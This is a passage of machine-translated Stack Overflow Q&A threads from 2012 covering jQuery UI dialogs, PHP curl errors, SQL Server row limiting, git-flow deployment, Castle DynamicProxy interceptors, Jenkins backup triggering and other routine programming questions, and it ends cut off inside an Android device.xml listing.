奖励：如果可以的话，我也想实现类似于无限滚动的东西。

多谢你们！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-20T14:51:56.440

正如我们所讨论的，[WrapPanel](http://msdn.microsoft.com/en-us/library/system.windows.controls.wrappanel.aspx)对您来说似乎是一个不错的选择。我可能还建议使用一个巧妙的小技巧来获得一些附加效果，您可以将[FluidMoveBehavior](http://msdn.microsoft.com/en-us/library/ff723946%28v=expression.40%29.aspx)应用到 WrapPanel 以使其在过渡上做 pizazz 变得有点简单。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-08T17:04:19.047

我可以补充一下，有一个开源[WPF-Masonry 库](https://github.com/Lizzaran/WPF-Masonry%20WPF-Masonry%20library)吗？

另外，还有一个相关的问题，[在桌面应用程序中有这个库使用 Fluid layout wrap panel / VariableSizedWrapGrid 的例子吗？](https://stackoverflow.com/questions/19590930/fluid-layout-wrap-panel-variablesizedwrapgrid-in-desktop-applications%20Fluid%20layout%20wrap%20panel%20/%20VariableSizedWrapGrid%20in%20desktop%20applications?)

# jquery-ui - 确认对话框中的 Jquery UI

> ID：13418248
> 
> 赞同：0
> 
> 时间：2012-11-16T14:09:30.193
> 
> 标签：jquery-ui, confirm

如何将 jQueryUI 对话框实现为确认对话框？

当前代码：

```
$("#formular_submit").button().click(function () {
    var meinArray = []; //ein neues Array definieren für die <a href> links
    var say = $("[value='1']:checked").length;
    //Wenn kein Checkbox gesetzt ist, Fehler Meldung
    if (say == 0) {
        alert("Bitte waehlen Sie eine aus.");
        return false;
    }
    //Wenn ein oder mehere gewählt...    
    if (say >= 1) {
        $("[value='1']:checked").each(function () {
            //Alle Links mit "Title" versehen sind, in link Variable
            var link = $("a#links_jquery").attr('title');
            //Alle Werte, die im "link" gespeicher sind, hängt man an das Array an(mit push Method)
            meinArray.push(link);
        });
        //Ausgabe mit Return, mach das, ansonsten False
        return confirm("Möchten Sie wirklich diese News löschen : " + meinArray);
    }
    return false;
}); //formular_submitFunction END
​ 
```

这是一个例子：http: **[//jsfiddle.net/aldimeola1122/9MnGh/](http://jsfiddle.net/aldimeola1122/9MnGh/)**

我怎样才能做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T01:18:01.017

要将 jQueryUI 对话框实现为确认，您需要取消提交按钮上的`click`事件并在提交表单的“确认”按钮上实现处理程序。

这是一个示例（带有[更新的小提琴](http://jsfiddle.net/9MnGh/6/)以查看它的实际效果）：

```
$(document).ready(function() {
    $("#formular_submit").button().click(function(e) {
        var say = $("[value='1']:checked").length,
            d = $('<div />'),
            p = $('<p />'),
            ul = $('<ul />'),
            li = $('<li />');

        //Wenn kein Checkbox gesetzt ist, Fehler Meldung
        if (say === 0) {
            d.append(p.clone().text('Bitte waehlen Sie eine aus.')).dialog({
                "buttons": {
                    "schließen": function (e) {
                        $(this).dialog('close');
                    }
                }
            });
        }
        //Wenn ein oder mehere gewählt...    
        if (say > 0) {
            $("[value='1']:checked").each(function() {
                //Alle Links mit "Title" versehen sind, in link Variable
                var self = $(this),
                    link = self.siblings('label').find('a.links_jquery').attr('title');
                ul.append(li.clone().text(link));
            });
            //Ausgabe mit Return, mach das, ansonsten False
            d.append(p.clone().text('Möchten Sie wirklich diese News löschen:')).append(ul);
            d.dialog({
                "buttons": {
                    "schließen": function (e) {
                        $(this).dialog('close');
                    },
                    "bestätigen": function (e) {
                        $(this).dialog('close');
                        $('form#meinFormular').submit();
                    }
                }
            });
        }
        e.preventDefault()
        return false;
    }); //formular_submitFunction END
});​ 
```

另外，如果我用德语命名错误，我提前道歉。我只知道谷歌翻译告诉我什么。:)

# php - curl返回错误111套接字

> ID：13418249
> 
> 赞同：1
> 
> 时间：2012-11-16T14:09:34.840
> 
> 标签：php, curl

我在下面得到了这个简单的 curl 代码：

```
$target = "/plugin/api_register.php?name=$activation_name&key=$activation_key&url=$siteurl";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://domain.com'.$target);
        curl_setopt($ch, CURLOPT_REFERER, $siteurl);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_VERBOSE, 1); 
        $output = curl_exec($ch);
        if (empty($output))
        {
           // some kind of an error happened
           die(curl_error($ch));
        } 
        curl_close($ch);
        print_r($output); 
```

我得到的只是套接字错误：111，我不知道为什么它不会连接。请帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:33:27.907

Errno 111 表示连接被拒绝。

可能有几个原因

*   没有运行 http 服务器
*   TCP 队列已满
*   防火墙阻止您的请求

# sql - SQL查询返回表中的所有列，但最多有3个重复ID

> ID：13418251
> 
> 赞同：1
> 
> 时间：2012-11-16T14:09:38.510
> 
> 标签：sql, sql-server, tsql

有人可以帮忙解决这个问题吗？我一直在愚弄 LIMIT 或 TOP，但我认为我偏离了轨道。我想从表中返回所有字段，但在新表中最多有 3 个重复的 id。

**桌子**

```
id    first    last    
===================
1    John    Doe    
1    John    Doe   
1    John    Doe   
1    John    Doe   
2    Mary    Green  
2    Mary    Green  
3    Stacy   Kirk  
3    Stacy   Kirk  
3    Stacy   Kirk  
3    Stacy   Kirk  
3    Stacy   Kirk 
```

**期望的结果（最多 3 个 ID）**

```
id    first    last  
====================
1    John     Doe  
1    John     Doe  
1    John     Doe  
2    Mary     Green  
2    Mary     Green  
3    Stacy    Kirk  
3    Stacy    Kirk  
3    Stacy    Kirk 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:13:16.297

既然你提到`TOP`了，这是为了`SQL SERVER`

```
SELECT id, first, last
FROM
  (
  SELECT id, first, last,
        ROW_NUMBER() OVER (PARTITION BY ID ORDER BY LAST) rn
  FROM TABLE1
  ) s
WHERE s.rn <= 3 
```

*   [**SQLFiddle 演示**( *SQL Server* )](http://sqlfiddle.com/#!3/08ccd/1)

# android - 加载数据后，Android webview在后退按钮上退出应用程序

> ID：13418254
> 
> 赞同：1
> 
> 时间：2012-11-16T14:09:46.540
> 
> 标签：android

我有一个应用程序，它通过 Activity --> onStart() --> new LoadTask through AsyncTask --> onPosExecute() --> ListView --> listView.setOnItemClickListener() --> onItemClick() --> Creates 加载数据网页浏览

单击 listView 后，将调用 WebView 以显示更多详细信息，但是当您单击以从 WebView 返回到 listView 时，应用程序会退出。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:15:18.293

我认为您使用此代码`onItemClick()` `finish()`来完成您的活动`finish();`当您调用 Intent 打开 webView 时删除 this() 代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:45:20.703

解决这种公认的奇怪行为的一种hacky方法是覆盖后退按钮。使应用程序执行*not-as-the-user-expects-it-to*时通常不接受它，但在您的情况下它可能会有所帮助。

```
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    if (keyCode == KeyEvent.KEYCODE_BACK) {
        startActivity(new Intent(myClass.this, ListViewClass.class));
        return true;
    }
    return super.onKeyDown(keyCode, event);
} 
```

# windows-store-apps - Windows 8 商店设备应用程序开发

> ID：13418256
> 
> 赞同：2
> 
> 时间：2012-11-16T14:09:50.580
> 
> 标签：windows-store-apps

我们正在使用 C# 开发一个 Windows 8 商店设备应用程序，它将使用 C dll 中的 Win32 API 和 IOCTL 调用与设备通信。我们已经创建了一个带有 Create File 和一些 IOCTL 调用的 C dll，导入到 C# 应用程序中。集成进展顺利，当调用 Create File 函数时，它返回 'ACCESS DENIED ERROR'。我们还尝试创建具有向管理员请求的执行级别的清单，但问题仍未解决。我想知道是否可以直接使用 Win32 API 和 IOCTL 调用，还是需要使用任何包装器调用才能使其工作？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T10:22:45.233

并非所有 win32 api 都受支持。请参阅[http://msdn.microsoft.com/en-us/library/windows/apps/br205757.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/br205757.aspx)

特别是，支持 CreateFile2()。你试过用这个吗？[http://msdn.microsoft.com/en-us/library/windows/apps/hh449422.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh449422.aspx)

# android - 将 Phonegap Build 2.1 与 Phonegap 版本 2.2 一起使用

> ID：13418260
> 
> 赞同：0
> 
> 时间：2012-11-16T14:09:56.637
> 
> 标签：android, ios, cordova, build, cloud

我已将 phonegap 版本升级到 2.2，但我检查了构建仍然是 2.1 版本。项目升级和使用2.1版本运行云构建是否有任何问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:20:13.777

可能会有一些问题。如果他们更改了 js 如何从 2.1 版到 2.2 版调用本机函数的任何内容，我相信他们这样做是因为插件 api 的更改，您可能在应用程序上使用的某些功能可能无法在 1 个或多个平台上运行，因为版本差异。

基本上，您将从 2.2 js 版本进行调用，而 2.1 本机版本可能无法理解。您可能需要等待云构建的更新，或者将您的项目恢复到 2.1。

# classloader - Tomcat：在 WEB-INF/lib 中找不到类

> ID：13418262
> 
> 赞同：1
> 
> 时间：2012-11-16T14:09:57.930
> 
> 标签：classloader, tomcat7

我正在使用非开源库来处理图像。这个库依赖于 JPEG2000 图像类型的 JAI (jai_imageio.jar)。在独立程序中，一切正常，JPEG2000 图像得到正确处理。但是，当这两个 JAR 在 WAR 中部署到 Tomcat 时，找不到所需的 JAI 类。此外，如果我将 jai_imageio.jar 放在`$CATALINA_HOME/lib`JAI 类中，就会发现一切正常。

供应商告诉我他们找到了所需的类，如下所示：

```
Iterator iter = ImageIO.getImageReadersByFormatName("JPEG2000"); 
```

我的理论是，因为 ImageIO 是 JRE 的一部分，所以使用的类加载器是“通用”类加载器，而不是 WAR 类加载器。出于这个原因，在 WAR 中的 JAR 没有找到，但在 Tomcat lib 目录中找到了。这听起来正确还是发生了其他事情？

我不希望将 JAI JAR 部署到 Tomcat lib 目录；我想将它作为 WAR 的一部分发布。有没有办法解决这个类加载问题？正如我所提到的，我无权访问源代码。我也许可以要求进行一些更改以促进 WAR 部署，但我不确定那可能是什么，也许是一种设置阅读器的方法，但这似乎很笨拙。

我很欣赏对此任何部分的反馈。谢谢。

# java - 谷歌文档 api 文件夹

> ID：13418263
> 
> 赞同：1
> 
> 时间：2012-11-16T14:10:00.223
> 
> 标签：java, api, directory

我正在尝试开发一个 java 函数来通过 Google Docs 检索一个特定文件夹的 id，但是这种语言的文档很差，并且在开发它时遇到了问题。到目前为止，我可以做到这一点，但不工作，它永远不会显示我文件夹的文档 ID

```
public void findfolder(String folderName) throws MalformedURLException,IOException,ServiceException{

URL feedUrla=new URL("https://docs.google.com/feeds/default/private/full/-/folder");

DocumentQuery query = new DocumentQuery(feedUrl);
query.setTitleQuery(folderName);
query.setTitleExact(true);
DocumentListFeed feed=null;

try {
feed = client.getFeed(query, DocumentListFeed.class);
} catch (IOException e) {
e.printStackTrace();
} catch (ServiceException e) {
e.printStackTrace();
}

for (DocumentListEntry entry : feed.getEntries()) {
System.out.println(entry.getDocId());
}
}` 
```

# git - 使用 Github 部署的 Git 流程

> ID：13418266
> 
> 赞同：4
> 
> 时间：2012-11-16T14:10:11.377
> 
> 标签：git, deployment, github, release, git-flow

我在一个由 4 名其他开发人员组成的团队中，我们正在学习 GIT，并使用 gitflow 模型和 github 作为中央存储库。到目前为止，我们已经在 github 上创建了中央存储库，我们可以创建功能，将它们推送到中央存储库并从那里拉取以获取彼此的更改。

所有开发人员都在他们的本地机器上工作，但是我们设置了 3 个服务器 - 开发、登台和生产。

开发是每个人都可以查看彼此变化的地方，一旦我们感到高兴，我们将转移到登台。在我们最终使网站投入生产之前，将在这里进行测试以确保一切正常。

该网站目前已经完成，我们已经在开发服务器上克隆了存储库并提取了所有网站文件，以便我们可以看到那里的所有更改。但是，我们现在不确定是否应该部署到登台并最终部署到生产中。

1.  我们是否首先在本地创建一个发布分支并推送到中央仓库？
2.  我们是否在登台和生产服务器上克隆中央仓库？
3.  如果是这样，我们是从中央仓库中提取还是不应该在生产服务器上使用 GIT？我读过关于使用 rsync 和钩子的信息？！

如果有人可以请解释接下来的步骤，或者将我指向某个解释它的地方，这将非常有帮助。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:32:53.197

我会安排一个人负责部署到不同的服务器，尤其是登台和生产。这样，当您创建发布分支时，该分支将部署在登台服务器上。发布分支完成后，您将主分支部署到生产服务器。

您可以将 repo 克隆到暂存和生产，只需确保 .git 目录具有适当的安全性*（.htaccess 是您的朋友 :)）*，这样非开发人员就无法访问该目录。

我会在生产服务器上使用 git pull 。我也读过关于 rsync 和 hooks 的文章，但是 git 对我来说很好用。

现在，有时当我为不允许服务器上的 git 的客户端工作时，我使用 ftp。github 上有一个名为[git-ftp](https://github.com/ezyang/git-ftp)的 Pyhton 程序，我对其进行了一些调整以适应 git-flow。我还没有把那个版本放在github上，也许我应该。

***作为第一条评论的后续行动，进行***
登台和生产发布的人将在他/她的本地计算机上执行以下步骤：

```
git flow release start -F 1.0 
```

做一些工作，比如更新版本号 发布到 github

```
git flow release publish 1.0 
```

在登台服务器上：

```
git pull origin release/1.0 
```

暂存期结束后，在本地计算机上

```
git flow release finish 1.0 
```

在生产服务器上

```
git pull origin master 
```

# c# - 如何为返回 IEnumerable 的方法编写拦截器

> ID：13418267
> 
> 赞同：3
> 
> 时间：2012-11-16T14:10:11.283
> 
> 标签：c#, ienumerable, idisposable, castle-dynamicproxy

我编写了简单的拦截器（使用 Castle.DynamicProxy）来处理数据库连接生命周期。即所有服务都有 Connection 属性，在第一次使用时会打开一个新的。每次方法调用后都会自动关闭连接：

```
class CloseConnectionInterceptor : IInterceptor
{
    public void Intercept(IInvocation invocation)
    {
        try
        {
            invocation.Proceed();
        }
        finally
        {
            var hasConnection = invocation.InvocationTarget as IHasConnection;
            if (hasConnection.IsConnectionOpen)
            {
                hasConnection.Connection.Dispose();
                hasConnection.Connection = null;
            }
        }
    }
}

interface IHasConnection
{
    bool IsConnectionOpen { get; }
    Connection Connection { get; set; }
} 
```

除了返回迭代器的方法外，它运行良好：

```
[Test]
public void ConnectionClosedByProxy()
{
    // arrange
    var service = new MyService();
    var proxy = new ProxyGenerator()
        .CreateInterfaceProxyWithTarget<IMyService>(
            service, new CloseConnectionInterceptor());

    // act
    proxy.GetList();

    // assert: works!!!
    Assert.IsFalse(service.IsConnectionOpen);
}

[Test]
public void IteratorLeavesOpenConnection()
{
    // arrange
    var service = new MyService();
    var proxy = new ProxyGenerator()
        .CreateInterfaceProxyWithTarget<IMyService>(
            service, new CloseConnectionInterceptor());

    // act
    proxy.GetEnumerable().ToList();

    // assert: bad, bad, bad!
    Assert.IsTrue(service.IsConnectionOpen);
} 
```

在此处查看完整示例：[https ://gist.github.com/4087483](https://gist.github.com/4087483)

如果在我的 GetEnumerable 方法中有“using (new Connection())”语句，那么它会按预期工作 - 在最后一次访问迭代器后关闭连接。是否有可能在拦截器中捕捉到这一刻？或者我应该不仅代理方法而且代理结果 IEnumerable？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:20:37.603

我把答案的种子放在我的问题中:)。这是经过修改的拦截器，它也代理了 IEnumerable：

```
class CloseConnectionInterceptor : IInterceptor
{
    public void Intercept(IInvocation invocation)
    {
        Type genericType = invocation.Method.ReturnType.IsGenericType
            ? invocation.Method.ReturnType.GetGenericTypeDefinition()
            : null;

        if (genericType == typeof(IEnumerable<>))
        {
            invocation.Proceed();

            var method = GetType()
                .GetMethod("HandleIteratorInvocation")
                .MakeGenericMethod(
                    invocation.Method.ReturnType.GetGenericArguments()[0]);

            invocation.ReturnValue = method.Invoke(
                null,
                new[] { invocation.InvocationTarget, invocation.ReturnValue });
        }
        else
        {
            HandleNonIteratorInvocation(invocation);
        }
    }

    public static IEnumerable<T> HandleIteratorInvocation<T>(
        IHasConnection hasConnection, IEnumerable enumerable)
    {
        try
        {
            foreach (var element in enumerable)
                yield return (T)element;
        }
        finally
        {
            CloseOpenConnection(hasConnection);
        }
    }

    private static void HandleNonIteratorInvocation(IInvocation invocation)
    {
        try
        {
            invocation.Proceed();
        }
        finally
        {
            CloseOpenConnection(invocation.InvocationTarget as IHasConnection);
        }
    }

    private static void CloseOpenConnection(IHasConnection hasConnection)
    {
        if (hasConnection.IsConnectionOpen)
        {
            hasConnection.Connection.Dispose();
            hasConnection.Connection = null;
        }
    }
} 
```

# eclipse - 如何更改 Eclipse Twist 场景编辑器的字体（Eclipse 插件 - ThoughtWorks Studios）

> ID：13418270
> 
> 赞同：2
> 
> 时间：2012-11-16T14:10:21.247
> 
> 标签：eclipse, editor

我正在使用 Twist 作为开发自动测试的一部分，我想在扭曲场景编辑器中更改（减小大小）字体。我在“首选项”菜单的“Twist”部分中找不到任何选项，其他设置与 Eclipse 编辑器有关（例如用于 .java 文件）

问候， 弗拉德

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-13T22:07:54.690

弗拉德，转到窗口>首选项>使用“字体”过滤>单击颜色和字体>在基本文件夹中查找文本字体>编辑

请参阅截屏视频以获取演示 [http://screencast.com/t/ltf7OZFsZ](http://screencast.com/t/ltf7OZFsZ)

-拉尔斯

# c# - 如何加载数据库更改？

> ID：13418271
> 
> 赞同：0
> 
> 时间：2012-11-16T14:10:33.357
> 
> 标签：c#, .net, entity-framework, .net-4.0, entity-framework-5

*   我正在使用 Entity Framework 5 和 SQL Server 2008 R2。
*   我还实现了存储库模式。
*   这是一个桌面应用程序

我的系统运行良好，除了一个“小”细节。当两个或更多用户正在使用该应用程序时，其中一个人更改了数据，如果他不离开并重新进入该应用程序，另一个人就看不到它。我在这里得到了 Ladislav 的答案：[Load changes made in another DbContext](https://stackoverflow.com/questions/12246462/load-changes-made-in-another-dbcontext)

它奏效了。唯一的问题是，对于每个集合，我想确保它已更新，我必须对其进行硬编码。

即使它有效，但我不禁想到必须有更好的方法。我不认为 Entity Framework 不知道数据库何时更改并且需要重新检索数据。

那么，我做错了什么？

到目前为止，这就是我正在做的事情：

```
public class MyAppContext : DbContext 
{
    //DbSet<T> declarations
}

public class Context : IDisposable
{
    private readonly MyAppContext ctx;
    private Dictionary<Type, IRepository> repositories;

    private static Context instance;

    public static Context Instance
    {
        get
        {
            if (instance == null)
                instance = new Context();

            return instance;
        }
    }
    ...
}

// and then each repository have access to the context
public abstract class Repository<T> : IRepository
    where T : class
{
    protected readonly MyAppContext ctx;
    ...
} 
```

如您所见，我使用“单例”模式来访问上下文并避免双重上下文异常。

有任何想法吗？

# jquery - 自升级到 Xcode 4.5.2 后，模拟器中 iPad 应用程序的方向错误 - 使用 PhoneGap 1.9

> ID：13418272
> 
> 赞同：1
> 
> 时间：2012-11-16T14:10:34.870
> 
> 标签：jquery, ipad, cordova, ios6, xcode4.5

我对编程和所有这一切都很陌生。从字面上看，不久前从未接触过它，所以我的问题可能是一个真正的初学者问题。

正如标题所示，我昨天升级了我的 Xcode。这个硕士项目的主管说除非我升级 Xcode，否则我无法部署到我的 ipad，因为我需要能够部署到 iOS 6.0。在我升级 Xcode 之前，我的 Phonegap 项目在模拟器中运行良好。现在它已经向右旋转了 90 度！正如我在 iPad 部署信息中设置的那样，模拟器的方向仅为横向。

我是否需要使用某种 JQuery 代码来设置方向？我真的可以在这里使用一些帮助！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T15:57:57.193

万一有人感兴趣，事实证明，当我更新 xcode 时，它​​似乎无法与 phonegap 1.9 一起正常工作。我更新到phonegap 2.1，现在看起来不错！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T22:11:24.723

Have you tried rotating the simulator (I think Command-Left off the top of my head, though it's also available on the menu)? The orientation of the device is not necessarily connected to the project settings if you don't support all orientations.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T15:05:37.963

我不认为有任何其他方法可以设置应用程序的方向，但在 XCode 中。在最新的 XCode 中，您需要在不同的选项卡中设置 iPad 和 iPhone 的方向，您看到了吗？它也包含在我的屏幕截图中。我的 iPad 专用应用程序的设置如下所示，并且运行良好：

![我的 XCode 设置的屏幕截图](../Images/8746fe91584306f7b1960bc44b0c3e61.png)

# reporting-services - 自定义代码函数无法识别表达式生成的值

> ID：13418276
> 
> 赞同：1
> 
> 时间：2012-11-16T14:10:42.967
> 
> 标签：reporting-services, ssrs-2008

我有一个简单的函数，用于根据整数值设置单元格的背景颜色。当我从字段中传递一个值时，它可以正常工作，但是当我尝试从表达式中传递一个值时，它不起作用。

```
 Public Function GetColor(ByVal Percentage As Double) As String
                Dim returnValue As String

    Select Case Percentage
       Case Is < 10     
       returnValue = "No Color" 
    Case Is < 20    
       returnValue  = "Orange"
    Case Is >= 20   
       returnValue = "Red"  
    End Select

    Return returnValue
End Function 
```

表达式为：

```
=Code.GetColor((Fields!Total.Value/sum(Fields!Total.Value, "mainDataSetQuery"))) 
```

其中“mainDataSetQuery 是一个数据集而不是一个组。

这有效，但显然不是我想要的：

```
 =Code.GetColor(Fields!Total.Value) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T14:53:02.590

试试这个表达式：

=Code.GetColor((Fields!Total.Value/First(Fields!Total.Value, "mainDataSetQuery")))

# curl - 使用 Backup 插件从命令行触发 Jenkins 备份

> ID：13418280
> 
> 赞同：5
> 
> 时间：2012-11-16T14:11:04.450
> 
> 标签：curl, jenkins, backup, command-line-interface

### 问题

我的网络上的备份策略意味着提供备份路径和之前运行的可选命令，以便我可以准备备份

我需要备份我的 Jenkins 配置。简单地给出 Jenkins 数据目录的路径不是一个选项，因为：

1.  我只需要备份配置
2.  该目录的总磁盘使用量约为 80GB，远远超出了合理的备份大小（99% 由非关键工作区数据组成）

### 至今

我安装了[Backup Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Backup+Plugin)并找到了相当不错的设置。现在我想知道是否可以使用 bash 脚本远程触发它。我知道`curl`在 /jenkins/backup/launchBackup url 上使用应该可以解决问题，但是当我以匿名用户身份访问 URI 时出现 403 Forbidden 错误，并且找不到登录或获取的解决方案围绕这个。

那么有人知道从命令行触发*仅配置备份的简单方法吗？*

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-16T18:05:55.770

Jenkins wiki 描述了如何[在脚本中执行经过身份验证的登录](https://wiki.jenkins-ci.org/display/JENKINS/Authenticating+scripted+clients)。简短回答：从用户页面转到配置屏幕并获取 API 令牌，然后在运行脚本时将其用作密码。

我还没有尝试使用 Backup 插件，但它适用于运行常规构建，因此它应该适用于任何可编写脚本的调用。

无认证：

```
$ curl http://jenkins:8080/job/my%20job/build
[ HTML page saying "Authentication required" ] 
```

带认证：

```
$ curl --user dbacher:$MY_API_TOKEN http://jenkins:8080/job/my%20job/build
[ returns nothing and the build starts ] 
```

* * *

**更新**：修正了*工作*错字，感谢您的评论。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-07T23:54:51.610

Dave Bacher 的回答对我不起作用。我需要做：

```
$ curl http://jenkins:8080/job/MY_JOB_NAME/build?build 
```

这是工作，而不是工作，最后我需要 ?build 。

# java - 最后的补充？

> ID：13418281
> 
> 赞同：2
> 
> 时间：2012-11-16T14:11:20.780
> 
> 标签：java

help make 只能写代码，然后我是新手）下面是一段代码：

```
if(myName.equals(name)){
    BufferedReader br = null;
    try{
        File file =  new File("C:\\Users\\vany\\Desktop\\test\\" + list[i]);
        br =  new BufferedReader(new InputStreamReader(
        new FileInputStream(file), "UTF8"));

        PrintWriter wr =   response.getWriter();
        wr.print("<html>");
        wr.print("<head>");
        wr.print("<title>HelloWorld</title>");
        wr.print("<body>");
        wr.write("<div>");
        wr.write(br.readLine());

        wr.write(br.readLine());//link1
        wr.write("</div>");
        wr.write("<hr>");
        wr.print("</body>");
        wr.print("</html>");
        wr.close();
    }
    catch(XException e){
    } 
```

但要离开只是赶上 - 坏事添加到它？

```
 catch(XException e){

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:13:57.200

如果您`try/finally`在块中使用没有代码的语句，则`finally`相当于根本不使用`try/finally`。

在这种情况下，即使抛出异常，您的`finally`块*也应该包含关闭写入器和读取器的代码。*

如果您使用的是 Java 7，则可以使用[try-with-resources 语句](http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html)更简单地执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:12:55.927

如果您不需要`finally`，可以将其删除（以及`try`）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:16:09.827

try、catch 和 finally 的基本结构如下

```
try{
...
}catch(XException e){
...
}finally{
...
} 
```

如果您编写 try 那么您必须捕获异常或 finally 阻塞。

如果您已放置 try 那么您必须放置 catch 或 finally。

# wordpress - 在 Wordpress 页脚中编辑详细信息

> ID：13418287
> 
> 赞同：0
> 
> 时间：2012-11-16T14:11:43.027
> 
> 标签：wordpress, footer

我的一个朋友正在设计，她想在页脚中添加一些额外的细节。然而，她还想编辑主题的链接；

[http://www.certaxnorthampton.co.uk/](http://www.certaxnorthampton.co.uk/)

请你能告诉我这是从哪里显示数据的吗？正如我检查了footer.php 并且它似乎不在其中。

谢谢克里斯蒂

# javascript - IE/Chrome 卸载事件行为：刷新按钮与选择 URL 并按 Enter

> ID：13418297
> 
> 赞同：0
> 
> 时间：2012-11-16T14:12:25.393
> 
> 标签：javascript, internet-explorer, google-chrome, javascript-events

我有一个这样的事件，当他们离开我的页面时，他们会注销用户：

```
$(window).unload(function () {
   $.ajax('/Account/LogOff', { async: false });
}); 
```

在 IE 中，如果用户点击刷新按钮，他们将被注销，当页面重新加载时，它会检测到他们已注销并将他们重定向到登录页面。这有点烦人但可以接受的行为。

但是，如果用户在地址栏中选择 URL 并按 Enter，则浏览器会在`unload`事件发生之前以某种方式开始加载新页面并且用户已注销，但用户仍然已注销，并且我的主页上的操作失败，因为用户不再具有活动会话。

在 Chrome 中，即使使用刷新按钮也会导致这种情况发生。

有什么方法可以确保`unload`在新页面开始加载之前触发我的事件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:35:29.190

不，没有办法做到这一点。几年前，可以使用while循环来做ti，但浏览器已经杀死了它。

# jquery - instagram api，点赞

> ID：13418298
> 
> 赞同：0
> 
> 时间：2012-11-16T14:12:28.217
> 
> 标签：jquery, ajax, api, instagram

我正在使用 instagram API，不幸的是我有点卡住了。
设置完所有内容后，我为每个调用以下方法的 Instagram 图像设置了一个喜欢/不喜欢按钮。

```
vote = function(type, at, mid){
    // type = POST or DELETE
    // at = access_token
    // mid = media_id
    $.ajax({
        type: type,
        dataType: "jsonp",
        crossDomain:true,
        url: "https://api.instagram.com/v1/media/"+mid+"/likes?access_token="+at,
        success: function(data) {
            console.log(data);
        }
    });
} 
```

它返回消息（200，OK），表明我的喜欢被计算在内，但是实际上没有喜欢或不喜欢被计算在内。关于什么可能导致打嗝的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-20T09:53:18.173

如果未配置`OPTIONS`远程[HTTP 访问控制](https://developer.mozilla.org/en-US/docs/HTTP_access_control)，跨域 ajax 请求只能是 类型。而 Instagram 不是。

所以这将是服务器端的工作。向您自己的 URL 发出 ajax 请求将向 Instagram 发出请求（可能使用 CURL）。

如果您不需要响应，则可以“伪造”该请求。制作 HTML 并提交

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T10:09:15.530

试试下面的代码。

```
var access_token = "https://api.instagram.com/v1/media/"+mid+"/likes?access_token="+at
var url = 
$.post(url, {access_token: access_token},
 function(data) {
   alert("Data Loaded: " + data);
}, "json"); 
```

# android - 在 UI 编辑器 android 上未指定 Intellij 设备

> ID：13418299
> 
> 赞同：5
> 
> 时间：2012-11-16T14:12:29.920
> 
> 标签：android, intellij-idea

我刚刚更新到 Intellij Community 的最新版本，但是当我尝试编辑 xml 文件时，我无法预览它，出现渲染错误 - 未指定设备，我怎样才能恢复默认配置？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-23T07:41:27.310

为了在 Intellij 中进行设备配置，您需要将**`device.xml`**文件 from修改`USER_HOME/.android folder`为**`device.xml`**from ，`SDK_FOLDER/tools/lib/device.xml`然后尝试在 Intellij 中再次重新打开布局文件文件，您将获得所有设备配置。

**但是，如果您拥有****最新版本的 Android SDK 工具，**这将不起作用，

 **如果您拥有最新的 SDK，请尝试将 USER_HOME/.android/device.xml 替换为以下内容。并尝试再次在 Intellij 中重新打开布局文件。

```
<?xml version="1.0"?>
<d:layout-devices
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:d="http://schemas.android.com/sdk/android/layout-devices/1">

    <d:device name="2.7in QVGA">
        <d:default>
            <d:screen-size>small</d:screen-size>
            <d:screen-ratio>notlong</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>ldpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>240</d:size>
                <d:size>320</d:size>
            </d:screen-dimension>
            <d:xdpi>145</d:xdpi>
            <d:ydpi>145</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="2.7in QVGA slider">
        <d:default>
            <d:screen-size>small</d:screen-size>
            <d:screen-ratio>notlong</d:screen-ratio>
